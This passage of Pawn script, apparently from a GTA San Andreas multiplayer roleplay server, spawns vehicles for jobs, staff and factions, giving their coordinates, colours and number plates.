    FarmerVeh[1] = AddStaticVehicleEx(532,-382.8609,-1465.2964,26.7162,262.4081,0,0,900);
    FarmerVeh[2] = AddStaticVehicleEx(532,-392.8095,-1487.2607,26.3314,268.0157,0,0,900);
    FarmerVeh[3] = AddStaticVehicleEx(532,-399.6307,-1500.4774,25.4502,265.1973,0,0,900);
    FarmerVeh[4] = AddStaticVehicleEx(532, -414.2045, -1422.1563, 27.1342, 90.2316, -1, -1, 100);
    FarmerVeh[5] = AddStaticVehicleEx(532, -414.1668, -1432.0951, 27.1342, 90.2316, -1, -1, 100);
    FarmerVeh[6] = AddStaticVehicleEx(532, -414.3888, -1441.5072, 27.1342, 90.2316, -1, -1, 100);
    FarmerVeh[7] = AddStaticVehicleEx(532, -413.4614, -1451.1367, 26.7160, 90.2316, -1, -1, 100);
    FarmerVeh[8] = AddStaticVehicleEx(532, -402.1859, -1460.6575, 26.7160, 90.2316, -1, -1, 100);
    FarmerVeh[9] = AddStaticVehicleEx(532, -402.1184, -1450.9613, 26.7160, 90.2316, -1, -1, 100);
    FarmerVeh[10] = AddStaticVehicleEx(532, -413.2160, -1461.3772, 26.7160, 90.2316, -1, -1, 100);
    FarmerVeh[11] = AddStaticVehicleEx(532, -424.7322, -1461.6963, 26.7560, 90.2316, -1, -1, 100);
    FarmerVeh[12] = AddStaticVehicleEx(532, -1066.8014, -1180.5748, 130.1522, 268.1898, -1, -1, 100);
    FarmerVeh[13] = AddStaticVehicleEx(532, -1065.8776, -1162.1466, 130.1522, 268.1898, -1, -1, 100);
    FarmerVeh[14] = AddStaticVehicleEx(532, -1027.1071, -1141.1381, 130.2964, 89.9396, -1, -1, 100);
    FarmerVeh[15] = AddStaticVehicleEx(532, -1027.1772, -1150.4639, 130.2964, 89.9396, -1, -1, 100);
    FarmerVeh[16] = AddStaticVehicleEx(532, -1027.2444, -1159.3685, 130.2964, 89.9396, -1, -1, 100);
    FarmerVeh[17] = AddStaticVehicleEx(532, -1027.3092, -1167.9709, 130.2964, 89.9396, -1, -1, 100);
    FarmerVeh[18] = AddStaticVehicleEx(532, -1067.6309, -1219.0204, 130.1522, 268.1898, -1, -1, 100);
    FarmerVeh[19] = AddStaticVehicleEx(532, -1067.3989, -1227.5566, 130.1522, 268.1898, -1, -1, 100);
    FarmerVeh[20] = AddStaticVehicleEx(532, -1066.2123, -1237.0024, 130.1522, 268.1898, -1, -1, 100);
    FarmerVeh[21] = AddStaticVehicleEx(532, -1068.0912, -1248.8252, 130.1522, 268.1898, -1, -1, 100);
    //=========================================================================
    GarbageVeh[0] = AddStaticVehicleEx(408, 2101.7573, -1995.9170, 14.2101, 89.8202, 1, 1, 100);
    GarbageVeh[1] = AddStaticVehicleEx(408, 2047.7432, -1974.6190, 14.0974, 91.0867, 1, 1, 100);
    GarbageVeh[2] = AddStaticVehicleEx(408, 2038.0350, -1974.8585, 14.0974, 91.0867, 1, 1, 100);
    GarbageVeh[3] = AddStaticVehicleEx(408, 2027.7756, -1974.8771, 14.0974, 91.0867, 1, 1, 100);
    GarbageVeh[4] = AddStaticVehicleEx(408, 2057.6240, -1974.3774, 14.0974, 91.0867, 1, 1, 100);
    GarbageVeh[5] = AddStaticVehicleEx(408, 2065.1409, -1974.6561, 14.0974, 181.0644, 1, 1, 100);
    GarbageVeh[6] = AddStaticVehicleEx(408, 2075.6853, -1977.4357, 14.0974, 181.0644, 1, 1, 100);
    GarbageVeh[7] = AddStaticVehicleEx(408, 2093.7947, -1982.8190, 14.2101, 89.8202, 1, 1, 100);
    GarbageVeh[8] = AddStaticVehicleEx(408, 2085.3376, -1990.4233, 14.2101, 89.8202, 1, 1, 100);
    //========================================[Ghayegh fish]==============================
    AddStaticVehicleEx(453, 2732.0818, -2320.7488, 0.5420, 0.0000, 1, 1, 100);
    AddStaticVehicleEx(453, 2721.6157, -2311.9521, 0.5398, 90.0000, 1, 1, 100);
    AddStaticVehicleEx(453, 2717.8792, -2573.7278, -0.0127, 0.0000, 1, 1, 100);
    AddStaticVehicleEx(453, 2726.8174, -2584.3909, -0.0127, 90.0000, 1, 1, 100);
    AddStaticVehicleEx(453, 719.7889, -1704.9569, 0.1061, 180.0000, 1, 1, 100);
    AddStaticVehicleEx(453, 720.2123, -1639.2371, 0.1061, 180.0000, 1, 1, 100);
//////////////////// SMF vehicles
//////////////////// SMF vehicles
    //maping
    AddStaticVehicle(496,751.447021,-1228.473632,13.553401,0.00,3,6); //HotelGTA To Life
    AddStaticVehicle(496,747.146545,-1229.287841,13.553401,0.00,6,3); //HotelGTA To Life
    AddStaticVehicle(522,729.987304,-1287.127319,13.135647,0.00,4,4); //HotelGTA To Life
    AddStaticVehicle(439,748.324096,-1285.040527,13.557509,0.00,3,3); //HotelGTA To Life
    AddStaticVehicle(439,752.368713,-1286.243164,13.565617,0.00,5,5); //HotelGTA To Life
    //Staff Cars
    stfcar = AddStaticVehicle(522,2558.764404,1596.138549,10.820312,0.00,3,3); //Staff NRG
    stfcar1 = AddStaticVehicle(522,2557.641113,1596.468261,10.820312,0.00,3,3); //Staff NRG
    stfcar2 = AddStaticVehicle(522,2556.320312,1596.886230,10.820312,0.00,3,3); //Staff NRG
    stfcar3 = AddStaticVehicle(522,2554.507812,1597.034667,10.820312,0.00,3,3); //Staff NRG
    stfcar4 = AddStaticVehicle(522,2552.636474,1596.963745,10.820312,0.00,3,3); //Staff NRG
    stfcar5 = AddStaticVehicle(522,2553.414062,1597.314208,10.820312,0.00,3,3); //Staff NRG
    stfcar6 = AddStaticVehicle(522,2551.686767,1597.435791,10.820312,0.00,3,3); //Staff NRG
    stfcar7 = AddStaticVehicle(522,2549.959960,1593.703491,10.820312,0.00,3,3); //Staff NRG
    stfcar8 = AddStaticVehicle(411,2545.228027,1595.041992,10.820312,0.00,3,3); //Staff Infer
    stfcar9 = AddStaticVehicle(411,2543.252197,1595.605590,10.820312,0.00,3,3); //Staff Infer
    stfcar10 = AddStaticVehicle(411,2540.274658,1595.766723,10.820312,0.00,3,3); //Staff Infer
    stfcar11 = AddStaticVehicle(411,2535.229492,1595.744018,10.820312,0.00,3,3); //Staff Infer
    stfcar12 = AddStaticVehicle(411,2532.772216,1594.330078,10.820312,0.00,3,3); //Staff Infer
    stfcar13 = AddStaticVehicle(411,2531.057861,1595.843139,10.820312,0.00,3,3); //Staff Infer
    stfcar14 = AddStaticVehicle(560,2506.038330,1574.682861,10.820312,0.00,3,3); //Staff Sultan
    stfcar15 = AddStaticVehicle(560,2505.045898,1571.296386,10.820312,0.00,3,3); //Staff Sultan
    stfcar16 = AddStaticVehicle(560,2504.898193,1567.609008,10.820312,0.00,3,3); //Staff Sultan
    stfcar17 = AddStaticVehicle(560,2504.449707,1563.949584,10.820312,0.00,3,3); //Staff Sultan
    stfcar18 = AddStaticVehicle(560,2504.162841,1561.014526,10.820312,0.00,3,3); //Staff Sultan
    stfcar19 = AddStaticVehicle(560,2503.630371,1557.393798,10.820312,0.00,3,3); //Staff Sultan
    stfcar20 = AddStaticVehicle(560,2503.950683,1553.979003,10.820312,0.00,3,3); //Staff Sultan
    stfcar21 = AddStaticVehicle(560,2504.046630,1550.184204,10.820312,0.00,3,3); //Staff Sultan
    stfcar22 = AddStaticVehicle(451,2514.369140,1544.703857,10.820312,0.00,3,3); //Staff Turismo
    stfcar23 = AddStaticVehicle(451,2517.825439,1544.473876,10.820312,0.00,3,3); //Staff Turismo
    stfcar24 = AddStaticVehicle(451,2522.079101,1544.675781,10.820312,0.00,3,3); //Staff Turismo
    stfcar25 = AddStaticVehicle(451,2526.074707,1544.742309,10.820312,0.00,3,3); //Staff Turismo
    stfcar26 = AddStaticVehicle(451,2530.439941,1544.463012,10.820312,0.00,3,3); //Staff Turismo
    stfcar27 = AddStaticVehicle(451,2535.128906,1544.531982,10.820312,0.00,3,3); //Staff Turismo
    stfcar28 = AddStaticVehicle(451,2540.325439,1544.591796,10.820312,0.00,3,3); //Staff Turismo
    stfcar29 = AddStaticVehicle(560,2546.816894,1544.682128,10.820312,0.00,3,3); //Staff Turismo
    stfcar30 = AddStaticVehicle(541,2559.131835,1550.038208,10.820312,0.00,3,3); //Staff Bullet
    stfcar31 = AddStaticVehicle(541,2559.334228,1545.490722,10.820312,0.00,3,3); //Staff Bullet
    stfcar32 = AddStaticVehicle(541,2559.247558,1540.392089,10.820312,0.00,3,3); //Staff Bullet
    stfcar33 = AddStaticVehicle(541,2558.838378,1536.085205,10.820312,0.00,3,3); //Staff Bullet
    stfcar34 = AddStaticVehicle(541,2557.296386,1532.003417,10.820312,0.00,3,3); //Staff Bullet

    NewsVeh[0] = AddStaticVehicleEx(582,-336.562744,1515.221923,74.937194,353.054168,2,111,900); SetVehicleNumberPlate(NewsVeh[0], "RPT 006");
    NewsVeh[1] = AddStaticVehicleEx(582,-333.595550,1514.355346,74.923110,353.054168,2,111,900); SetVehicleNumberPlate(NewsVeh[1], "RPT 007");
    NewsVeh[2] = AddStaticVehicleEx(582,-330.302703,1514.726562,74.930885,353.054168,2,111,900); SetVehicleNumberPlate(NewsVeh[2], "RPT 008");
    NewsVeh[3] = AddStaticVehicleEx(582,-327.172546,1515.594970,74.883232,353.054168,2,111,900); SetVehicleNumberPlate(NewsVeh[3], "RPT 009");
    NewsVeh[4] = AddStaticVehicleEx(582,-269.883941,1548.060180,75.086456,139.066314,2,111,900); SetVehicleNumberPlate(NewsVeh[4], "RPT 010");
    NewsVeh[5] = AddStaticVehicleEx(582,-339.80496216,1515.19262695,75.51437378,0.00000,2,111,900); SetVehicleNumberPlate(NewsVeh[5], "RPT 001");
    NewsVeh[6] = AddStaticVehicleEx(582,-324.05468750,1515.01550293,75.51437378,0.00000000,2,111,900); SetVehicleNumberPlate(NewsVeh[6], "RPT 002");
    NewsVeh[7] = AddStaticVehicleEx(582,-267.92913818,1544.99902344,75.51437378,135.00000000,2,111,900); SetVehicleNumberPlate(NewsVeh[7], "RPT 003");
    NewsVeh[8] = AddStaticVehicleEx(582,-299.90615845,1577.44921875,75.51437378,135.99975586,2,111,900); SetVehicleNumberPlate(NewsVeh[8], "RPT 004");
    NewsVeh[9] = AddStaticVehicleEx(488,-294.05288696,1538.25170898,75.82749939,224.00000000,2,111,900); SetVehicleNumberPlate(NewsVeh[9], "RPT 005");
    NewsVeh[10] = AddStaticVehicleEx(582,-346.017425,1515.082641,75.414764,359.635864,2,111,900); SetVehicleNumberPlate(NewsVeh[10], "RPT 011");
    NewsVeh[11] = AddStaticVehicleEx(582,-312.398773,1534.649169,75.505744,88.305847,2,111,900); SetVehicleNumberPlate(NewsVeh[11], "RPT 012");
    NewsVeh[12] = AddStaticVehicleEx(582,-285.130889,1562.672485,75.417556,139.066314,2,111,900); SetVehicleNumberPlate(NewsVeh[12], "RPT 013");
    NewsVeh[13] = AddStaticVehicleEx(488,-376.305236,1525.861083,75.711883,260.130554,2,111,900); SetVehicleNumberPlate(NewsVeh[13], "RPT 014");

	SilVeh[0] = AddStaticVehicle(409, 713.0000, -1422.0000, 13.2400, 0.0000,12,12); SetVehicleNumberPlate(SilVeh[0], "SM 001");
	SilVeh[1] = AddStaticVehicle(506, 709.5000, -1437.8000, 13.2600, 0.0000,12,12); SetVehicleNumberPlate(SilVeh[1], "SM 002");
	SilVeh[2] = AddStaticVehicle(495, 703.6700, -1425.0000, 13.4600, 0.0000,12,12); SetVehicleNumberPlate(SilVeh[2], "SM 003");
	SilVeh[3] = AddStaticVehicle(495, 703.6700, -1419.5000, 13.4600, 0.0000,12,12); SetVehicleNumberPlate(SilVeh[3], "SM 004");
	SilVeh[4] = AddStaticVehicle(411, 712.5010, -1437.8000, 13.2600, 0.0000,12,12); SetVehicleNumberPlate(SilVeh[4], "SM 005");
	SilVeh[5] = AddStaticVehicle(506, 715.5000, -1437.8000, 13.2600, 0.0000,12,12); SetVehicleNumberPlate(SilVeh[5], "SM 006");
	SilVeh[6] = AddStaticVehicle(541, 718.5000, -1437.8000, 13.2600, 0.0000,12,12); SetVehicleNumberPlate(SilVeh[6], "SM 007");
	SilVeh[7] = AddStaticVehicle(411, 721.5000, -1437.8000, 13.2600, 0.0000,12,12); SetVehicleNumberPlate(SilVeh[7], "SM 008");
	SilVeh[8] = AddStaticVehicle(541, 724.5000, -1437.8000, 13.2600, 0.0000,12,12); SetVehicleNumberPlate(SilVeh[8], "SM 009");
	SilVeh[9] = AddStaticVehicle(487, 732.0000, -1460.0000, 22.2600, 0.0000,12,12); SetVehicleNumberPlate(SilVeh[9], "SM 010");
	SilVeh[10] = AddStaticVehicle(487, 718.0000, -1460.0000, 22.2600, 0.0000,12,12); SetVehicleNumberPlate(SilVeh[10], "SM 011");
	SilVeh[11] = AddStaticVehicle(522, 714.0000, -1449.5000, 17.2180, 0.0000,12,12); SetVehicleNumberPlate(SilVeh[11], "SM 012");
	SilVeh[12] = AddStaticVehicle(521, 715.0000, -1449.5000, 17.2180, 0.0000,12,12); SetVehicleNumberPlate(SilVeh[12], "SM 013");
	SilVeh[13] = AddStaticVehicle(522, 716.0000, -1449.5000, 17.2180, 0.0000,12,12); SetVehicleNumberPlate(SilVeh[13], "SM 014");
	SilVeh[14] = AddStaticVehicle(521, 717.0000, -1449.5000, 17.2180, 0.0000,12,12); SetVehicleNumberPlate(SilVeh[14], "SM 015");
	SilVeh[15] = AddStaticVehicle(522, 718.0000, -1449.5000, 17.2180, 0.0000,12,12); SetVehicleNumberPlate(SilVeh[15], "SM 016");
	SilVeh[16] = AddStaticVehicle(521, 719.0000, -1449.5000, 17.2180, 0.0000,12,12); SetVehicleNumberPlate(SilVeh[16], "SM 017");
	SilVeh[17] = AddStaticVehicle(560, 727.5000, -1437.8000, 13.2600, 0.0000,12,12); SetVehicleNumberPlate(SilVeh[17], "SM 018");
	SilVeh[18] = AddStaticVehicle(560, 730.5000, -1437.8000, 13.2600, 0.0000,12,12); SetVehicleNumberPlate(SilVeh[18], "SM 019");
	SilVeh[19] = AddStaticVehicle(560, 733.5000, -1437.8000, 13.2600, 0.0000,12,12); SetVehicleNumberPlate(SilVeh[19], "SM 020");
	SilVeh[20] = AddStaticVehicle(560, 736.5000, -1437.8000, 13.2600, 0.0000,12,12); SetVehicleNumberPlate(SilVeh[20], "SM 021");
	SilVeh[21] = AddStaticVehicle(415, 742.0000, -1437.8000, 13.2600, 0.0000,12,12); SetVehicleNumberPlate(SilVeh[21], "SM 022");
	SilVeh[22] = AddStaticVehicle(415, 739.0000, -1437.8000, 13.2600, 0.0000,12,12); SetVehicleNumberPlate(SilVeh[22], "SM 023");
	SilVeh[23] = AddStaticVehicle(451, 706.5000, -1437.8000, 13.2600, 0.0000,12,12); SetVehicleNumberPlate(SilVeh[23], "SM 024");
	SilVeh[24] = AddStaticVehicle(451, 703.5000, -1437.8000, 13.2600, 0.0000,12,12); SetVehicleNumberPlate(SilVeh[24], "SM 025");
	SilVeh[25] = AddStaticVehicle(493, 728.0000, -1495.0000, 0.7373, 180.0000,12,12); SetVehicleNumberPlate(SilVeh[25], "SM 026");
	SilVeh[26] = AddStaticVehicle(493, 718.0000, -1495.0000, 0.7373, 180.0000,12,12); SetVehicleNumberPlate(SilVeh[26], "SM 027");

    FNFVeh[0] = AddStaticVehicle(411, 1413.9988, 743.1000, 10.5253, 270.0000,136,136); SetVehicleNumberPlate(FNFVeh[0], "FnF 001");
    FNFVeh[1] = AddStaticVehicle(487, 1435.0000, 788.0000, 10.9832, 90.0000,136,136); SetVehicleNumberPlate(FNFVeh[1], "FnF 002");
    FNFVeh[2] = AddStaticVehicle(559, 1414.0000, 695.4000, 10.7547, 270.0000,136,136); SetVehicleNumberPlate(FNFVeh[2], "FnF 003");
    FNFVeh[3] = AddStaticVehicle(487, 1422.0000, 788.0000, 11.0429, -90.0000,136,136); SetVehicleNumberPlate(FNFVeh[3], "FnF 004");
    FNFVeh[4] = AddStaticVehicle(506, 1414.0000, 765.5000, 10.5279, 270.0000,136,136); SetVehicleNumberPlate(FNFVeh[4], "FnF 005");
    FNFVeh[5] = AddStaticVehicle(560, 1414.0000, 717.9000, 10.5474, 270.0000,136,136); SetVehicleNumberPlate(FNFVeh[5], "FnF 006");
    FNFVeh[6] = AddStaticVehicle(521, 1468.0000, 787.0000, 10.3917, 180.0000,136,136); SetVehicleNumberPlate(FNFVeh[6], "FnF 007");
    FNFVeh[7] = AddStaticVehicle(534, 1451.9000, 787.0000, 11.1708, 180.0000,136,136); SetVehicleNumberPlate(FNFVeh[7], "FnF 008");
    FNFVeh[8] = AddStaticVehicle(415, 1414.0000, 749.5000, 10.4453, 270.0000,136,136); SetVehicleNumberPlate(FNFVeh[8], "FnF 009");
    FNFVeh[9] = AddStaticVehicle(415, 1414.0000, 752.7000, 10.4453, 270.0000,136,136); SetVehicleNumberPlate(FNFVeh[9], "FnF 010");
    FNFVeh[10] = AddStaticVehicle(541, 1414.0000, 755.9000, 10.4453, 270.0000,136,136); SetVehicleNumberPlate(FNFVeh[10], "FnF 011");
    FNFVeh[11] = AddStaticVehicle(541, 1414.0000, 759.1000, 10.4453, 270.0000,136,136); SetVehicleNumberPlate(FNFVeh[11], "FnF 012");
    FNFVeh[12] = AddStaticVehicle(506, 1414.0000, 768.7000, 10.5279, 270.0000,136,136); SetVehicleNumberPlate(FNFVeh[12], "FnF 013");
    FNFVeh[13] = AddStaticVehicle(411, 1414.0000, 771.9000, 10.5279, 270.0000,136,136); SetVehicleNumberPlate(FNFVeh[13], "FnF 014");
    FNFVeh[14] = AddStaticVehicle(451, 1414.0000, 775.1000, 10.5279, 270.0000,136,136); SetVehicleNumberPlate(FNFVeh[14], "FnF 015");
    FNFVeh[15] = AddStaticVehicle(451, 1414.0000, 778.3000, 10.5279, 270.0000,136,136); SetVehicleNumberPlate(FNFVeh[15], "FnF 016");
    FNFVeh[16] = AddStaticVehicle(560, 1414.0000, 714.7000, 10.5474, 270.0000,136,136); SetVehicleNumberPlate(FNFVeh[16], "FnF 017");
    FNFVeh[17] = AddStaticVehicle(560, 1414.0000, 711.5000, 10.5474, 270.0000,136,136); SetVehicleNumberPlate(FNFVeh[17], "FnF 018");
    FNFVeh[18] = AddStaticVehicle(560, 1414.0000, 708.3000, 10.5474, 270.0000,136,136); SetVehicleNumberPlate(FNFVeh[18], "FnF 019");
    FNFVeh[19] = AddStaticVehicle(560, 1414.0000, 705.1000, 10.5474, 270.0000,136,136); SetVehicleNumberPlate(FNFVeh[19], "FnF 020");
    FNFVeh[20] = AddStaticVehicle(560, 1414.0000, 701.9000, 10.5474, 270.0000,136,136); SetVehicleNumberPlate(FNFVeh[20], "FnF 021");
    FNFVeh[21] = AddStaticVehicle(534, 1455.1000, 787.0000, 11.1708, 180.0000,136,136); SetVehicleNumberPlate(FNFVeh[21], "FnF 022");
    FNFVeh[22] = AddStaticVehicle(495, 1458.3000, 788.0000, 11.1708, 180.0000,136,136); SetVehicleNumberPlate(FNFVeh[22], "FnF 023");
    FNFVeh[23] = AddStaticVehicle(495, 1461.5000, 788.0000, 11.1708, 180.0000,136,136); SetVehicleNumberPlate(FNFVeh[23], "FnF 024");
    FNFVeh[24] = AddStaticVehicle(495, 1464.7000, 788.0000, 11.1708, 180.0000,136,136); SetVehicleNumberPlate(FNFVeh[24], "FnF 025");
    FNFVeh[25] = AddStaticVehicle(522, 1469.0000, 787.0000, 10.3917, 180.0000,136,136); SetVehicleNumberPlate(FNFVeh[25], "FnF 026");
    FNFVeh[26] = AddStaticVehicle(522, 1467.0000, 787.0000, 10.3917, 180.0000,136,136); SetVehicleNumberPlate(FNFVeh[26], "FnF 027");
    FNFVeh[27] = AddStaticVehicle(521, 1470.0000, 786.9877, 10.3917, 180.0000,136,136); SetVehicleNumberPlate(FNFVeh[27], "FnF 028");
    FNFVeh[28] = AddStaticVehicle(522, 1471.0000, 786.9877, 10.3917, 180.0000,136,136); SetVehicleNumberPlate(FNFVeh[28], "FnF 029");
    FNFVeh[29] = AddStaticVehicle(521, 1472.0000, 786.9877, 10.3917, 180.0000,136,136); SetVehicleNumberPlate(FNFVeh[29], "FnF 030");
    FNFVeh[30] = AddStaticVehicle(522, 1473.0000, 786.9877, 10.3917, 180.0000,136,136); SetVehicleNumberPlate(FNFVeh[30], "FnF 031");
    FNFVeh[31] = AddStaticVehicle(559, 1414.0000, 692.2000, 10.7547, 270.0000,136,136); SetVehicleNumberPlate(FNFVeh[31], "FnF 032");
    FNFVeh[32] = AddStaticVehicle(579, 1414.0000, 689.0000, 10.7547, 270.0000,136,136); SetVehicleNumberPlate(FNFVeh[32], "FnF 033");
    FNFVeh[33] = AddStaticVehicle(579, 1414.0000, 686.0000, 10.7547, 270.0000,136,136); SetVehicleNumberPlate(FNFVeh[33], "FnF 034");
    FNFVeh[34] = AddStaticVehicle(579, 1414.0000, 682.7000, 10.7547, 270.0000,136,136); SetVehicleNumberPlate(FNFVeh[34], "FnF 035");
	FNFVeh[35] = AddStaticVehicle(409, 1446.5000, 750.7500, 10.5400, 180.0000,136,136); SetVehicleNumberPlate(FNFVeh[35], "FnF 036");

	DTVeh[0] = AddStaticVehicle(411, 2611.0000, 2279.3999, 10.6000, 90.0000, 128, 128); SetVehicleNumberPlate(DTVeh[0], "DT 001");
	DTVeh[1] = AddStaticVehicle(411, 2611.0000, 2275.3000, 10.6000, 90.0000, 128, 128); SetVehicleNumberPlate(DTVeh[1], "DT 002");
	DTVeh[2] = AddStaticVehicle(487, 2612.0000, 2443.0200, 14.9800, 180.0000, 128, 128); SetVehicleNumberPlate(DTVeh[2], "DT 003");
	DTVeh[3] = AddStaticVehicle(487, 2612.0000, 2432.0000, 14.9800, 0.0000, 128, 128); SetVehicleNumberPlate(DTVeh[3], "DT 004");
	DTVeh[4] = AddStaticVehicle(487, 2626.0000, 2432.0000, 14.9800, 0.0000, 128, 128); SetVehicleNumberPlate(DTVeh[4], "DT 005");
	DTVeh[5] = AddStaticVehicle(487, 2626.0000, 2443.0000, 14.9800, 180.0000, 128, 128); SetVehicleNumberPlate(DTVeh[5], "DT 006");
	DTVeh[6] = AddStaticVehicle(506, 2593.5000, 2279.1499, 10.4800, -90.0000, 128, 128); SetVehicleNumberPlate(DTVeh[6], "DT 007");
	DTVeh[7] = AddStaticVehicle(506, 2593.5000, 2275.2500, 10.4800, -90.0000, 128, 128); SetVehicleNumberPlate(DTVeh[7], "DT 008");
	DTVeh[8] = AddStaticVehicle(415, 2593.5000, 2271.6001, 10.4800, -90.0000, 128, 128); SetVehicleNumberPlate(DTVeh[8], "DT 009");
	DTVeh[9] = AddStaticVehicle(506, 2593.5000, 2267.8999, 10.4800, -90.0000, 128, 128); SetVehicleNumberPlate(DTVeh[9], "DT 010");
	DTVeh[10] = AddStaticVehicle(506, 2593.5000, 2264.1001, 10.4800, -90.0000, 128, 128); SetVehicleNumberPlate(DTVeh[10], "DT 011");
	DTVeh[11] = AddStaticVehicle(415, 2581.8999, 2279.1499, 10.4800, 90.0000, 128, 128); SetVehicleNumberPlate(DTVeh[11], "DT 012");
	DTVeh[12] = AddStaticVehicle(415, 2581.8999, 2275.2500, 10.4800, 90.0000, 128, 128); SetVehicleNumberPlate(DTVeh[12], "DT 013");
	DTVeh[13] = AddStaticVehicle(506, 2581.8999, 2271.7000, 10.4800, 90.0000, 128, 128); SetVehicleNumberPlate(DTVeh[13], "DT 014");
	DTVeh[14] = AddStaticVehicle(415, 2581.8999, 2267.8999, 10.4800, 90.0000, 128, 128); SetVehicleNumberPlate(DTVeh[14], "DT 015");
	DTVeh[15] = AddStaticVehicle(409, 2565.0000, 2279.8000, 10.5000, -90.0000, 128, 128); SetVehicleNumberPlate(DTVeh[15], "DT 016");
	DTVeh[16] = AddStaticVehicle(415, 2581.8999, 2264.1001, 10.4800, 90.0000, 128, 128); SetVehicleNumberPlate(DTVeh[16], "DT 017");
	DTVeh[17] = AddStaticVehicle(560, 2611.0000, 2271.2000, 10.5000, 90.0000, 128, 128); SetVehicleNumberPlate(DTVeh[17], "DT 018");
	DTVeh[18] = AddStaticVehicle(560, 2611.0000, 2267.0000, 10.5000, 90.0000, 128, 128); SetVehicleNumberPlate(DTVeh[18], "DT 019");
	DTVeh[19] = AddStaticVehicle(560, 2611.0000, 2262.7000, 10.5000, 90.0000, 128, 128); SetVehicleNumberPlate(DTVeh[19], "DT 020");
	DTVeh[20] = AddStaticVehicle(541, 2611.0000, 2258.6001, 10.5000, 90.0000, 128, 128); SetVehicleNumberPlate(DTVeh[20], "DT 021");
	DTVeh[21] = AddStaticVehicle(541, 2611.0000, 2254.3999, 10.5000, 90.0000, 128, 128); SetVehicleNumberPlate(DTVeh[21], "DT 022");
	DTVeh[22] = AddStaticVehicle(541, 2611.0000, 2250.1001, 10.5000, 90.0000, 128, 128); SetVehicleNumberPlate(DTVeh[22], "DT 023");
	DTVeh[23] = AddStaticVehicle(451, 2594.2000, 2251.0000, 10.4000, 0.0000, 128, 128); SetVehicleNumberPlate(DTVeh[23], "DT 024");
	DTVeh[24] = AddStaticVehicle(451, 2589.7000, 2251.0000, 10.4000, 0.0000, 128, 128); SetVehicleNumberPlate(DTVeh[24], "DT 025");
	DTVeh[25] = AddStaticVehicle(451, 2585.2000, 2251.0000, 10.4000, 0.0000, 128, 128); SetVehicleNumberPlate(DTVeh[25], "DT 026");
	DTVeh[26] = AddStaticVehicle(451, 2580.6001, 2251.0000, 10.4000, 0.0000, 128, 128); SetVehicleNumberPlate(DTVeh[26], "DT 027");
	DTVeh[27] = AddStaticVehicle(522, 2565.0000, 2248.0000, 10.3397, -90.0000, 128, 128); SetVehicleNumberPlate(DTVeh[27], "DT 028");
	DTVeh[28] = AddStaticVehicle(521, 2565.0000, 2249.5000, 10.3397, -90.0000, 128, 128); SetVehicleNumberPlate(DTVeh[28], "DT 029");
	DTVeh[29] = AddStaticVehicle(522, 2565.0000, 2251.0000, 10.3397, -90.0000, 128, 128); SetVehicleNumberPlate(DTVeh[29], "DT 030");
	DTVeh[30] = AddStaticVehicle(521, 2565.0000, 2252.5000, 10.3397, -90.0000, 128, 128); SetVehicleNumberPlate(DTVeh[30], "DT 031");
	DTVeh[31] = AddStaticVehicle(522, 2565.0000, 2254.0000, 10.3397, -90.0000, 128, 128); SetVehicleNumberPlate(DTVeh[31], "DT 032");
	DTVeh[32] = AddStaticVehicle(521, 2565.0000, 2255.5000, 10.3397, -90.0000, 128, 128); SetVehicleNumberPlate(DTVeh[32], "DT 033");

	LMVeh[0] = AddStaticVehicle(411, 1247.0000, -2057.7000, 59.6600, -90.0000, 6, 6); SetVehicleNumberPlate(LMVeh[0], "LM 001");
	LMVeh[1] = AddStaticVehicle(411, 1247.0000, -2053.0000, 59.6600, -90.0000, 6, 6); SetVehicleNumberPlate(LMVeh[1], "LM 002");
	LMVeh[2] = AddStaticVehicle(487, 1117.0000, -2050.0000, 74.5400, 0.0000, 6, 6); SetVehicleNumberPlate(LMVeh[2], "LM 003");
	LMVeh[3] = AddStaticVehicle(487, 1117.0000, -2024.0000, 74.5400, 180.0000, 6, 6); SetVehicleNumberPlate(LMVeh[3], "LM 004");
	LMVeh[4] = AddStaticVehicle(506, 1244.5000, -2011.5000, 59.5800, 180.0000, 6, 6); SetVehicleNumberPlate(LMVeh[4], "LM 005");
	LMVeh[5] = AddStaticVehicle(506, 1247.5000, -2011.5000, 59.5800, 180.0000, 6, 6); SetVehicleNumberPlate(LMVeh[5], "LM 006");
	LMVeh[6] = AddStaticVehicle(506, 1250.5000, -2011.5000, 59.5800, 180.0000, 6, 6); SetVehicleNumberPlate(LMVeh[6], "LM 007");
	LMVeh[7] = AddStaticVehicle(560, 1256.5000, -2011.5000, 59.5800, 180.0000, 6, 6); SetVehicleNumberPlate(LMVeh[7], "LM 008");
	LMVeh[8] = AddStaticVehicle(560, 1259.5000, -2011.5000, 59.5800, 180.0000, 6, 6); SetVehicleNumberPlate(LMVeh[8], "LM 009");
	LMVeh[9] = AddStaticVehicle(560, 1262.5000, -2011.5000, 59.5800, 180.0000, 6, 6); SetVehicleNumberPlate(LMVeh[9], "LM 010");
	LMVeh[10] = AddStaticVehicle(560, 1265.5000, -2011.5000, 59.5800, 180.0000, 6, 6); SetVehicleNumberPlate(LMVeh[10], "LM 011");
	LMVeh[11] = AddStaticVehicle(521, 1245.0000, -2044.5000, 59.5800, -90.0000, 6, 6); SetVehicleNumberPlate(LMVeh[11], "LM 012");
	LMVeh[12] = AddStaticVehicle(522, 1245.0000, -2043.5000, 59.5800, -90.0000, 6, 6); SetVehicleNumberPlate(LMVeh[12], "LM 013");
	LMVeh[13] = AddStaticVehicle(521, 1245.0000, -2042.5000, 59.5800, -90.0000, 6, 6); SetVehicleNumberPlate(LMVeh[13], "LM 014");
	LMVeh[14] = AddStaticVehicle(522, 1245.0000, -2041.5000, 59.5800, -90.0000, 6, 6); SetVehicleNumberPlate(LMVeh[14], "LM 015");
	LMVeh[15] = AddStaticVehicle(521, 1245.0000, -2040.5000, 59.5800, -90.0000, 6, 6); SetVehicleNumberPlate(LMVeh[15], "LM 016");
	LMVeh[16] = AddStaticVehicle(522, 1245.0000, -2039.5000, 59.5800, -90.0000, 6, 6); SetVehicleNumberPlate(LMVeh[16], "LM 017");
	LMVeh[17] = AddStaticVehicle(415, 1271.5000, -2011.5000, 59.5800, 180.0000, 6, 6); SetVehicleNumberPlate(LMVeh[17], "LM 018");
	LMVeh[18] = AddStaticVehicle(415, 1274.5000, -2011.5000, 59.5800, 180.0000, 6, 6); SetVehicleNumberPlate(LMVeh[18], "LM 019");
	LMVeh[19] = AddStaticVehicle(415, 1277.5000, -2011.5000, 59.5800, 180.0000, 6, 6); SetVehicleNumberPlate(LMVeh[19], "LM 020");
